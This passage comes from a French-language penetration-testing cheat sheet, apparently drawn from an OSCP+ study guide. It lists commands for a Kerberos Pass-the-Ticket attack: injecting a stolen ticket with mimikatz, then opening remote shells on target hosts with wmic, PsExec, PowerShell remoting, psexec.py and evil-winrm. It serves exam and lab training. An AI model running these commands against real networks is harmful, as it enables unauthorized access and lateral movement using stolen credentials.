kerberos::ptt C:\path\to\admin_ticket.kirbi
```


**Paramètres et repères :**
`klist`  


Commande `wmic` pour la rubrique « Pass-the-Ticket (PtT) ».

```powershell
# From Windows

# Using VMI
wmic /node:[target_host] process call create "cmd.exe"

# Using PsExec - SysInternal (May still require plaintext creds unless SMB session picks up Kerberos ticket)
PsExec.exe \\[target_host] -u [domain]\[username] cmd.exe

# Using WinRM (PowerShell Remoting)
Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]

# RDP: use mstsc (Remote Desktop), if TGT is injected correctly and domain trust allows it, you won’t be prompted for a password.
```


Commande `kirbi2ccache` pour la rubrique « Pass-the-Ticket (PtT) ».

```bash
# From Kali

# Transfer the .kirbi to your Kali machine (use techniques from Section 17), and then convert the .kirbi ticket
kirbi2ccache [ticket_file].kirbi > [ticket_file].ccache
export KRB5CCNAME=./[ticket_file].ccache

# Using PsExec
psexec.py -k -no-pass [domain]/[username]@[target_host]

# Using Evil-WinRM
evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
